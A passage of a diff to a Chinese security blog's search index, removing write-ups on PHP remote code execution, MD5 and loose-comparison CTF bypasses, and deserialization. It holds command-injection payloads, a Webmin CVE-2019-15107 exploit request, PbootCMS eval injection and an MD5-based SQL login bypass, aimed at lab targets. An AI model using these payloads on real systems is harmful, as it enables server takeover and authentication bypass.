+文件包含：文件被PHP引擎执行
+文件下载：文件直接二进制输出下载到本地
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>御网杯2026 Web部分题解</title>
     <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
     <content><![CDATA[一、WEB-Snake_Game1. 题目
@@ -2152,245 +3182,6 @@ PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAn
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE漏洞</title>
-    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、RCE简介与危害
-RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
-成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
-危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
-案例：
-
-
-远程代码执行（eval函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
-
-测试payload：
-
-http://localhost/1.php?x=phpinfo();
-http://localhost/1.php?x=echo%20abc;
-
-
-
-
-
-
-远程命令执行（system函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
-
-测试payload
-
-http://localhost/2.php?x=ipconfig
-
-
-
-
-http://localhost/2.php?x=whoami
-
-
-二、墨者学院靶场https://mozhe.cn/
-案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
-
-
-
-页面输入127.0.0.1正常ping
-
-
-
-
-确认系统
-
-
-
-
-前端JS限制IP格式，前端过滤可绕过。
-
-
-
-
-Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
-
-
-
-
-查看返回目录：index.php、key_xxxx.php。
-
-
-
-
-最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
-
-
-
-
-注：命令分隔符有|、||、&amp;、&amp;&amp;、;
-
-案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
-
-
-
-
-
-解析代码，使⽤php
-
-注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
-&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
-
-新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
-
-
-PHP中内容反引号内内容会被当作系统shell命令执行。
-&lt;?phpecho `$_REQUEST[a]`;?&gt;
-
-
-payload1：?a=ls 列出当前目录，发现key文件。
-
-
-
-
-payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
-
-
-
-案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
-https://mozhe.cn/bug/detail/309
-(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
-
-漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
-(3) 操作
-
-
-
-
-
-
-
-
-
-
-登录拦截
-
-
-
-
-漏洞测试：利用数据包
-
-POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
-
-Host: 靶机IP:端口	改成自己的
-常用 Payload
-
-old=test|id 执行id查看当前用户
-old=test|ls / 列出根目录文件
-old=test|cat /key.txt 读取根目录key
-
-
-
-
-获取 cookie
-
-
-
-
-
-
-
-案例4 PbootCMS代码执行漏洞
-
-(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
-审计⼯具查询危险函数：
-
-
-
-
-
-
-
-
-eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
-
-(2) 操作
-在线留言
-
-
-
-AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
-
-
-
-
-
-
-
-
-登录后台：admin.php
-
-
-
-账号：admin 密码：1234556
-
-
-
-
-
-访问首页：http://localhost/pcms/index.php/about/10.html
-POST传参：1=phpinfo();，触发eval执行代码。
-
-
-
-
-三、RCE漏洞防御方案
-危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
-尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
-若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
-
-
-四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
-remote code execution 远程代码执行
-Q2：命令执行漏洞的危害是什么？执行系统命令
-权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
-查看权限的命令
-Linux 查看权限：id
-Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
-Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
-Q4：如果给源代码，如何进行代审？通过找命令执行函数
-例如：
-
-system：执行系统命令，自带输出结果。
-shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
-例如： echo shell_exec($cmd);
-
-
-exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
-例如： echo exec($cmd);
-
-
-passthru：执行系统命令，自带输出结果。
-popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
-&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
-
-Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
-Q6：如何反弹 shell？
-nc 反弹 shell
-bash 反弹 shell
-（Windows）powershell 反弹shell	Online - Reverse Shell Generator
-
-Q7：如何修复 RCE 漏洞？
-后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
-php 自带函数（禁用）PHP: escapeshellarg - Manual
-在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -3452,797 +4243,6 @@ deny_arr：黑名单
       </categories>
       <tags>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性利用之MD5</title>
-    <url>/2026/06/22/PHP-MD5%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/index/</url>
-    <content><![CDATA[一、[Bugku CTF] MD51. 题目
-
-2. 解题思路
-在题目页面，发现有一个下载文件。
-
-
-
-代码审计，md5。
-
-
-&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;); // 计算固定字符串的MD5，结果是0e83040045199491692543859291139$a = @$_GET[&#x27;a&#x27;];       // 接收GET参数a，@抑制错误$md52 = @md5($a);       // 计算a的MD5，@抑制错误if(isset($a))&#123;          // 检查是否传入参数a    if ($a != &#x27;QNKCDZO&#x27; &amp;&amp;$md51 ==$md52) &#123; // 核心条件：a≠QNKCDZO 且 两者MD5相等        echo &quot;flag**************&quot;; // 满足条件输出flag    &#125; else &#123;        echo &quot;false!!!&quot;;    &#125;&#125; else&#123;    echo &quot;please input a&quot;; // 未传a则提示&#125;?&gt;
-
-PHP MD5弱类型比较漏洞：
-
-md5(&#39;QNKCDZO&#39;) 的结果是 0e83040045199491692543859291139，以0e开头，PHP会将其解析为科学计数法的0；
-
-只要找一个**不等于QNKCDZO**的字符串，其MD5也以0e开头，就能满足 $md51 ==$md52；
-
-也可以用数组绕过（更通用）：md5(数组)返回NULL，但这里优先用经典的0e字符串解法。
-
-访问网页，它让我输入a。
-
-经典0e字符串
-
-
-找MD5以0e开头且不等于QNKCDZO的字符串，常用的有：
-?a=s878926199a?a=240610708
-
-
-拿到flag
-
-
-
-二、[ctf.show] web51. 题目
-2. 解题步骤
-读代码：
-
-&lt;?php$flag=&quot;&quot;;$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];if(isset($v1) &amp;&amp; isset($v2))&#123;    if(!ctype_alpha($v1))&#123;        die(&quot;v1 error&quot;);    &#125;    if(!is_numeric($v2))&#123;        die(&quot;v2 error&quot;);    &#125;    if(md5($v1)==md5($v2)&#123;        echo $flag;    &#125;&#125;?&gt;
-
-
-ctype_alpha($v1)：要求 v1 必须是纯字母字符串。
-is_numeric($v2)：要求 v2 必须是数字或数字字符串。
-$v1 == $v2：使用了 PHP 的弱类型比较 ==，这是本题的突破口。
-
-
-所以要找两个不同的字符串，一个是纯字母，一个是纯数字，它们md5哈希值在弱类型下判定为0。
-
-0e 开头的 MD5 哈希值以及对应的原始明文：
-
-
-// 原始值 =&gt; MD5哈希&quot;240610708&quot; =&gt; &quot;0e462097431906509019562988736854&quot;,&quot;QNKCDZO&quot;   =&gt; &quot;0e830400451993494058024219903391&quot;,&quot;aabg7XSs&quot;  =&gt; &quot;0e087386482136013740957780965295&quot;,&quot;aabC9RqS&quot;  =&gt; &quot;0e041022518165728065344349536299&quot;,&quot;s878926199a&quot; =&gt; &quot;0e545993274517709034328855841020&quot;,&quot;s155964671a&quot; =&gt; &quot;0e342768416822451524974117254469&quot;,
-
-
-访问如下 URL 即可触发条件并获取 Flag：
-
-http://63a977ac-9022-493d-a0ff-b3294262a7be.challenge.ctf.show/?v1=QNKCDZO&amp;v2=240610708
-
-
-三、[BJDCTF2020] Easy MD51. 题目
-2. 解题思路
-随便输入点东西点击”提交查询”发现没有任何回显，所以这里查看一下页面源代码，看一下是否有提示。
-
-看到header联想到HTTP的头。
-
-
-
-
-浏览器开发者工具，在消息头中找到线索hint。
-
-
-select * from &#x27;admin&#x27; where password=md5($pass,true)
-
-给了一个sql语句，我们需要输入一个密码但是我们并不知道正确密码。这里需要利用md5绕过，让sql语句变成如下形式：
-select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;
-
-
-payload：ffifdyop
-
-
-md5($pass, true) 会返回 16 位原始二进制字符串，而非 32 位十六进制字符串。
-Payload 原理：输入字符串 ffifdyop 时，md5(&#39;ffifdyop&#39;, true) 生成的二进制字符串开头为 &#39;or&#39;6，拼接后 SQL 语句变为：
-
-select * from admin where password=&#x27;or&#x27;6xxxxxxxx
-
-or 后面非空字符串 &#39;6xxx&#39; 等价 true，整个条件恒成立，构造永真条件，绕过密码验证。
-
-
-查看页面源代码。
-
-
-PHP 中 == 是弱类型比较，以 0e 开头的字符串会被解析为科学计数法（值为 0），不同字符串的 MD5 若均以 0e 开头，比较结果为真。
-
-Payload（任选其一）：
-科学计数法绕过：”0e”开头的字符串都会以科学计数法来解析，而0的乘积都为0。所以构造md5加密后开头为0e的字符串即可：
-
-
-
-?a=QNKCDZO&amp;b=240610708
-
-
-
-数组绕过：
-
-?a[]=1&amp;b[]=2
-
-（PHP 中 md5(数组) 返回 null，null == null 为真，且 a[] != b[]）
-
-
-用POST方法传递数值，不能用GET方式。
-
-
-param1[]=1&amp;param2[]=2
-
-
-
-四、[CTFShow] web91. 题目
-2. 解题思路
-尝试登录，盲猜密码，无报错，无反应。
-
-找源码泄露，先试最常见的泄露路径：
-
-
-
-index.php
-index.php.swp
-index.php.bak
-robots.txt
-index.phps
-
-
-访问 index.phps 成功拿到源码。
-
-
-
-分析源码：
-
-
-从泄露的源码里，看到核心逻辑：
-$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
-
-
-关键漏洞：md5($password, true) 返回原始二进制字符串，如果这个字符串包含 &#39;or&#39;，就会构造出恒成立的 SQL 语句。
-
-
-构造 payload：一个能让 MD5 二进制包含 &#39;or&#39; 的密码，用经典的 ffifdyop 作为密码。
-
-
-它的 MD5 原始二进制值包含 &#39;or&#39;，代入 SQL 后变成：
-
-select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6xxxx&#x27;
-
-
-输入 ffifdyop，拿到flag。
-
-
-3. 知识点总结(1) 常见Web源码泄露场景核心区分
-
-
-文件类型
-服务器处理逻辑
-访问结果
-
-
-
-index.php
-调用PHP解释器执行代码
-仅显示页面内容，无源码
-
-
-各类备份&#x2F;泄露文件
-直接返回纯文本&#x2F;缓存内容
-可查看完整PHP源码
-
-
-高频源码泄露文件&#x2F;路径
-
-
-泄露类型
-典型路径
-产生原因
-
-
-
-PHP源码预览文件
-index.phps
-服务器配置为直接返回.phps后缀源码
-
-
-Vim缓存文件
-index.php.swp&#x2F;.swo&#x2F;.swn
-Vim编辑意外退出（死机&#x2F;断电）生成的缓存
-
-
-手动备份文件
-index.php.bak&#x2F;.backup
-开发者手动保存的源码备份
-
-
-编辑器自动备份
-index.php~
-Emacs等编辑器自动生成的备份文件
-
-
-版本控制文件
-.git/&#x2F;.svn/
-代码版本控制文件夹未删除
-
-
-敏感路径提示
-robots.txt
-网站声明的禁止爬虫路径，可能泄露后台&#x2F;源码路径
-
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>Lab-WP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性利用之弱比较</title>
-    <url>/2026/06/23/PHP%E5%BC%B1%E6%AF%94%E8%BE%83/index/</url>
-    <content><![CDATA[一、前置知识1. 基础概念区分
-== 弱比较PHP会自动隐式转换两边数据类型后再对比，是所有CTF弱类型题的核心漏洞点。
-
-=== 强比较同时校验值 + 数据类型，不做任何自动转换，无法用弱类型绕过，是标准防御写法。
-
-
-2. 绕过方法(1) 0e MD5 科学计数法绕过
-原理
-
-
-以 0e 开头且后续全为纯数字的字符串，在进行弱比较（==）时，会被 PHP 强制解析为科学计数法 0 × 10^n = 0。因此，任意两个满足此格式的字符串 == 判定恒为 true。
-示例：
-
-$a = md5(&#x27;240610708&#x27;); // 0e462097431906509019562988736854$b = md5(&#x27;QNKCDZO&#x27;);   // 0e830400458393240665909944582762var_dump($a == $b); // truevar_dump($a === $b);// false
-
-
-适用场景：后端使用弱比较判断两个不同输入的 MD5 或 SHA1 值是否相等。
-
-(2) 数字字符串截断匹配
-原理（PHP 8 之前）
-
-
-字符串和数字进行弱对比时，PHP 会从字符串开头提取数字，后面的字母直接丢弃。如果开头没有数字，则直接转为 0。
-示例：
-
-var_dump(123 == &quot;123abc&quot;);  // truevar_dump(0 == &quot;abc123&quot;);    // true，无开头数字直接转为0var_dump(0 == &quot;flag&quot;);     // true
-
-
-注意：PHP 8 此特性已废弃。PHP 8 会将数字转为字符串再比较，0 == &quot;flag&quot; 的结果变为 false。
-
-适用场景：要求传入的参数等于某个特定数字，传入”数字+字母”或”字母”触发隐式转换绕过（仅限 PHP 7 及以下）。
-
-
-(3) ffifdyop MD5 SQL注入绕过$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
-
-
-原理
-
-
-当后端使用 md5($password, true) 时，第二个参数 true 会让函数返回 16 字节的原始二进制格式，而不是 32 位的十六进制字符串。
-
-
-利用方式
-
-
-明文 ffifdyop 的 MD5 二进制数据中，恰好包含字符串 &#39;or&#39;6。拼接到 SQL 语句：
-拼接前：
-
-
-
-select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;
-
-
-拼接后：
-
-select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6...&#x27;
-
-这闭合了单引号，并形成了 or 6 的永真条件，直接绕过登录验证。我在 PHP特性利用之 MD5 这篇中有提到这种题目。
-(4) 数组绕过数组和字符串直接比较 [] == &quot;admin&quot; 结果是 false。真正的漏洞在于 PHP 的内置处理函数。
-
-利用方式
-
-
-md5()、sha1()、strcmp() 等函数期望接收字符串。如果传入数组（如：pass[]=1），函数无法处理会报错并返回 null。
-
-示例 1（弱比较绕过）
-
-
-strcmp($pass, &quot;admin&quot;) == 0
-
-传入数组后函数返回 null，随后 null == 0 判定为 true，成功绕过。
-
-示例 2（强比较绕过）
-
-$a !== $bmd5($a) === md5($b)
-
-传入两个不同的数组，哈希函数均返回 null，随后 null === null 判定为 true，成功绕过。
-
-注意：在 PHP 8 中，向这类函数传入数组不再返回 null，而是直接抛出 TypeError 致命错误导致程序崩溃，该方法失效。
-
-3. 总结通用类型转换规则：
-
-数字与字符串：PHP 8 之前：字符串转数字（从头截取，无数字转0）。PHP 8 及以后：数字转字符串比较。
-0e 规则：0e开头纯数字 &#x3D;&#x3D; 0e开头纯数字，结果恒为 true。
-数组特性：数组与任意数字或字符串直接弱比较，结果为 false。数组传入 md5 或 strcmp 等仅接收字符串的函数，返回 null（PHP 8 之前）或直接报错（PHP 8 及以后）。
-null == false == 0 == &quot;&quot; 互相弱比较全为 true。注意：PHP 8 中 0 == &quot;&quot; 的结果变为 false。
-
-
-二、[攻防世界] simple_php1. 题目
-
-2. 解题思路
-读代码
-
-&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a = @$_GET[&#x27;a&#x27;];$b = @$_GET[&#x27;b&#x27;];if ($a == 0 and$a) &#123;    echo$flag1;&#125;if (is_numeric($b)) &#123;    exit();&#125;if ($b &gt; 1234) &#123;    echo$flag2;&#125;?&gt;
-
-
-$a 的要求：弱等于 0，但又不能是 0 或空值（比如 0a、abc）。
-$b 的要求：不能是纯数字&#x2F;数字字符串，但弱比较要大于 1234（比如 1235a）。
-
-
-构造Payload如 ?a=0a&amp;b=1235a 即可同时获取 flag1 和 flag2。
-
-
-
-三、[攻防世界] PHP21. 题目
-2. 解题思路
-这句话 “Can you authenticate to this website?” 的意思是：”你能通过这个网站的身份验证吗？” 或 “你能登录&#x2F;认证到这个网站吗？”
-
-
-这个页面没有提供登录框、输入框等明显的交互方式，说明认证逻辑藏在代码或请求里，需要去挖掘。
-需要找到绕过身份验证的方法，比如：
-查看页面源码或备份文件
-分析隐藏的参数或 Cookie
-利用编码、弱类型等漏洞
-
-
-
-
-由于题目的标题是PHP，所以我们试一下 index.php 或者 index.phps。
-
-
-
-读代码
-
-&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;    echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);    exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;    echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;    echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;
-
-
-=== 强比较：禁止直接传入 id=admin。
-代码对 id 进行了第二次 URL 解码，我们可以利用这一点。
-绕过思路：对 &quot;admin&quot; 进行两次 URL 编码，让浏览器第一次解码后不等于 &quot;admin&quot;，通过第一层判断；代码第二次解码后得到 &quot;admin&quot;，触发第二层判断。
-
-
-用bp，对 admin 进行两次 URL 编码
-
-
-得到：
-%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
-
-
-构造 payload：
-
-?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
-
-
-成功绕过认证，获取 Flag
-
-
-
-四、[Bugku CTF] 各种绕过哟1. 题目
-2. 解题思路
-代码审计
-
-&lt;?phphighlight_file(&#x27;flag.php&#x27;);$id = urldecode($_GET[&#x27;id&#x27;]);$flag = &#x27;flag(xxxxxxxxxxxxxxx)&#x27;;if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123;    if ($_GET[&#x27;uname&#x27;] ==$_POST[&#x27;passwd&#x27;]) &#123;        print &#x27;passwd can not be uname.&#x27;;    &#125;    else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;]) &amp;&amp; ($id==&#x27;margin&#x27;)) &#123;        die(&#x27;Flag:&#x27;.$flag);    &#125;    else &#123;        print &#x27;sorry!&#x27;;    &#125;&#125;?&gt;
-
-
-GET传 uname 和 id；
-POST传 passwd；
-需满足的条件：
-$_GET[&#39;uname&#39;] !=$_POST[&#39;passwd&#39;]
-sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])（SHA1强相等）；
-$id = urldecode($_GET[&#39;id&#39;]); 并且 $id==&#39;margin&#39;
-
-
-
-
-分析条件
-
-
-PHP的 sha1() 函数只接受字符串&#x2F;数字，传入数组会返回 NULL；要求SHA1值必须强相等，那么传入两个不同的数组（比如 uname[]=1 和 passwd[]=2）满足 uname != passwd。
-id 直接传 margin，源码没有 if($id == &#39;margin&#39;) 这类校验逻辑，不存在匹配拦截，所以不需要二次 URL 编码绕过。
-
-3. 解题步骤
-代码审计，读懂代码，找到漏洞
-要满足拿到flag的三个条件
-给 GET 的 uname 传数组：uname[]=1 → sha1(uname) = NULL；
-
-给 POST 的 passwd 传数组：passwd[]=2 → sha1(passwd) = NULL；
-id 直接传 margin
-
-开发者工具→hackbar
-
-
-
-
-或者用bp
-
-
-请求方式改为 POST
-POST /?id=margin&amp;uname[]=1 HTTP/1.1
-
-
-
-五、[Bugku CTF] 矛盾1. 题目
-2. 解题思路
-代码分析
-
-$num = $_GET[&#x27;num&#x27;];if(!is_numeric($num))&#123;    echo $num;    if($num==1)    echo &#x27;flag&#123;*********&#125;&#x27;;&#125;
-
-
-is_numeric() 的官方定义是：专门用来检测变量是否为数字或纯数字字符串
-条件1：!is_numeric($num) 要求 num 的值不能是数字或数字字符串
-条件2：$num==1 要求 num 在弱比较中等于 1。
-
-
-绕过：传值 1+除数字之外的
-
-我们需要传一个不是数字类型，但弱比较等于1的值。
-
-
-
-
-六、[MRCTF2020] Ez_bypass1. 题目
-2. 解题思路
-查看源码
-
-
-
-代码分析
-
-md5($id) === md5($gg) &amp;&amp; $id !== $gg
-
-要让 $id 和 $gg 的 MD5 哈希值完全一样，但 $id 和 $gg 本身的内容必须不同。
-数组绕过：给 $id 和 $gg 传不同的数组
-
-!is_numeric($passwd) &amp;&amp; $passwd == 1234567
-
-传入的 passwd 不能是「纯数字」（is_numeric 返回 false），但用弱类型比较时，它又要等于数字 1234567。
-
-
-构造payload
-
-GET 部分
-?gg[]=1&amp;id[]=2
-
-POST 部分
-passwd=1234567a
-
-
-
-得到flag
-
-
-
-七、[CTFShow] web111. 题目
-2. 解题思路
-分析代码
-
-
-
-弱类型比较：最终使用 == 弱类型比较密码与 $_SESSION[&#39;password&#39;]
-绕过思路：$_SESSION[&#39;password&#39;] 和 $password 为空。简单说就是，删除 PHPSESSID 强制服务器生成未初始化的空 Session（其值为 NULL），并传入空字符串密码（&quot;&quot;），利用 PHP 底层 &quot;&quot; == NULL 恒为真的弱比较漏洞，成功绕过了登录验证。
-
-
-bp抓包修改。
-
-
-
-
-得到flag
-
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>Lab-WP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>序列化漏洞</title>
-    <url>/2026/06/26/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[一、PHP序列化与反序列化1. 基础概念
-序列化：将变量&#x2F;对象的数据转换为字符串，用于存储、网络传输。
-反序列化：将序列化后的字符串，还原为原本的变量&#x2F;对象。
-核心函数：
-serialize()：将对象&#x2F;变量转为序列化字符串
-unserialize()：将序列化字符串还原为对象&#x2F;变量
-
-
-
-补充概念
-类：一类事物的抽象定义，包含属性（特征）、方法（动作&#x2F;功能）。示例：
-汽车类：属性（颜色、马力），方法（启动、刹车）
-人类：属性（姓名、身高），方法（吃饭、睡觉）
-
-
-对象：类在内存中的实例化产物，是具体的个体。示例：车牌号京Axxxx的汽车、身份证号11010xxxxx的张三。
-主流编程语言（除C语言外）基本都支持面向对象与序列化操作。
-流转示意：对象 → 序列化 → 字节码&#x2F;字符串 → 网络传输&#x2F;存储 → 反序列化 → 还原对象
-
-2. 无类序列化案例案例1 基础字符串序列化&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;KFC&quot;;$str = $_GET[&#x27;str&#x27;];if(unserialize($str)===$KEY)&#123;echo &quot;$flag&quot; .&quot;&lt;/br&gt;&quot;;&#125;show_source(__FILE__);?&gt;
-
-解题操作使用PHP在线工具执行序列化代码：
-&lt;?phpecho serialize(&#x27;KFC&#x27;);?&gt;
-
-输出结果：s:3:&quot;KFC&quot;;
-格式说明：s代表字符串，6代表字符串字符长度。
-构造 payload：?str=s:3:&quot;KFC&quot;;
-案例2 CTF Cookie序列化题目页面代码：
-...&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123;show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;else&#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;&lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;?php&#125;$KEY = &#x27;ISecer:www.isecer.com&#x27;;?&gt;
-
-错误思路直接序列化ISecer:www.isecer.com，得到s:21:&quot;ISecer:www.isecer.com&quot;;，设置Cookie访问，结果无效。原因：$KEY变量在判断逻辑之后赋值，判断执行时$KEY为空字符串。
-正确解法序列化空字符串：
-&lt;?phpecho serialize(&quot;&quot;);?&gt;
-
-输出：s:0:&quot;&quot;;构造请求包，设置Cookie: ISecer=s:0:&quot;&quot;;
-3. 类与对象序列化（1）对象序列化&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$p = new Person();$obj = serialize($p);print_r($obj);?&gt;
-
-运行结果：O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;}格式说明：O代表对象，6为类名字符长度，2为对象属性个数。
-（2）对象反序列化&lt;?php$obj = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;;print_r(unserialize($obj));?&gt;
-
-（3）修改属性后反序列化简单来说，”修改属性后反序列化”指的是：在将一个对象反序列化（还原成程序中的对象）之前，人为地修改了代表该对象的”序列化字符串”的内容。
-&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$clz = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:25;&#125;&#x27;;$per = unserialize($clz);print_r($clz);echo &quot;&lt;br&gt;&quot;;echo $per-&gt;name;?&gt;
-
-4. 不同访问修饰符的序列化格式
-public（公共）：本类、子类、外部均可访问，序列化直接显示属性名。
-protected（受保护）：仅本类、子类可访问，序列化格式：\x00*\x00属性名（\x00为空字节）。
-private（私有）：仅本类内部可访问，序列化格式：\x00类名\x00属性名。
-
-示例：
-&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;protected $hobby = &#x27;eat&#x27;;private $age = 18;&#125;$p = new Person();$obj = serialize($p);echo &quot;&lt;br&gt;&quot;;print_r($obj);?&gt;
-
-输出结果：O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:8:&quot;*hobby&quot;;s:3:&quot;eat&quot;;s:11:&quot;Personage&quot;;i:18;}
-5. __wakeup 绕过
-原理： 某些 PHP 版本中，如果序列化字符串表示的对象属性个数，大于实际定义的属性个数，PHP 会跳过 __wakeup() 方法。
-动作： 将 O:6:&quot;Person&quot;:1:{...} 中的 1 改为 2 或更大。
-用途： 绕过 __wakeup 中可能存在的安全检测。
-
-
-二、PHP魔术方法魔术方法：PHP在特定场景下自动调用的内置方法，序列化漏洞核心利用点。
-
